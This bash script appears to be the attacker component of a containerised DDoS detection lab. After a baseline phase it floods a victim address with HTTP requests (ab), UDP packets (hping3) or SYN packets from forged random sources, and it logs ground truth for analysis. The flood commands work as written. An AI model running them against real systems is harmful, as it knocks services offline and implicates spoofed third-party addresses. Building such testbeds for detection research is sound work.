#!/bin/bash
# Attacker container: waits for the shared start time, stays quiet during the
# baseline phase, floods the victim for ATTACK seconds, then stops.
#
#   ATTACK_TYPE   http | udp | syn
#   HTTP_CONCURRENCY   parallel connections per bot (http)
#   UDP_INTERVAL_US    microseconds between packets per bot (udp)
#   SYN_INTERVAL_US    microseconds between forged SYNs (syn)
set -u

RESULTS=${RESULTS:-/results}
T0_FILE=${LAB_T0_FILE:-$RESULTS/t0}
VICTIM=${VICTIM_IP:-172.20.0.2}
ATTACK_TYPE=${ATTACK_TYPE:-http}
BASELINE=${BASELINE:-60}
ATTACK=${ATTACK:-120}
HTTP_CONCURRENCY=${HTTP_CONCURRENCY:-15}
UDP_INTERVAL_US=${UDP_INTERVAL_US:-1500}
SYN_INTERVAL_US=${SYN_INTERVAL_US:-1000}

MYIP=$(ip -4 -o addr show eth0 | awk '{print $4}' | cut -d/ -f1 | head -n1)

# Wait for the run script to publish the start time.
while [ ! -s "$T0_FILE" ]; do sleep 0.2; done
T0=$(cut -d. -f1 "$T0_FILE")
START=$((T0 + BASELINE))

# Ground truth for the analysis: which addresses really belong to the attack.
mkdir -p "$RESULTS/attackers"
if [ "$ATTACK_TYPE" = "syn" ]; then
    echo "spoofed-sources" > "$RESULTS/attackers/syn_attacker_$MYIP"
else
    echo "$ATTACK_TYPE" > "$RESULTS/attackers/$MYIP"
fi

NOW=$(date +%s)
if [ "$START" -gt "$NOW" ]; then sleep $((START - NOW)); fi

log_event() { echo "$(date +%s.%N | cut -c1-14),$1,$2,$3" >> "$RESULTS/events.csv"; }

log_event "$ATTACK_TYPE-attacker" attack_start "${ATTACK_TYPE};${MYIP}"
echo "[attacker $MYIP] $ATTACK_TYPE flood -> $VICTIM for ${ATTACK}s"

case "$ATTACK_TYPE" in
  http)
    # Real, complete HTTP requests from this bot's own address.
    timeout "$ATTACK" bash -c "while :; do ab -r -s 3 -n 2000 -c $HTTP_CONCURRENCY http://$VICTIM/ >/dev/null 2>&1; done"
    ;;
  udp)
    # UDP datagrams to port 53 from this bot's own address; source port changes per packet.
    timeout "$ATTACK" hping3 --udp -p 53 -d 64 -i "u$UDP_INTERVAL_US" "$VICTIM" >/dev/null 2>&1
    ;;
  syn)
    # One machine, a different forged source address on every SYN.
    timeout "$ATTACK" hping3 -S -p 80 --rand-source -i "u$SYN_INTERVAL_US" "$VICTIM" >/dev/null 2>&1
    ;;
  *)
    echo "unknown ATTACK_TYPE: $ATTACK_TYPE (use http, udp or syn)"
    exit 1
    ;;
esac

log_event "$ATTACK_TYPE-attacker" attack_stop "${ATTACK_TYPE};${MYIP}"
echo "[attacker $MYIP] done"
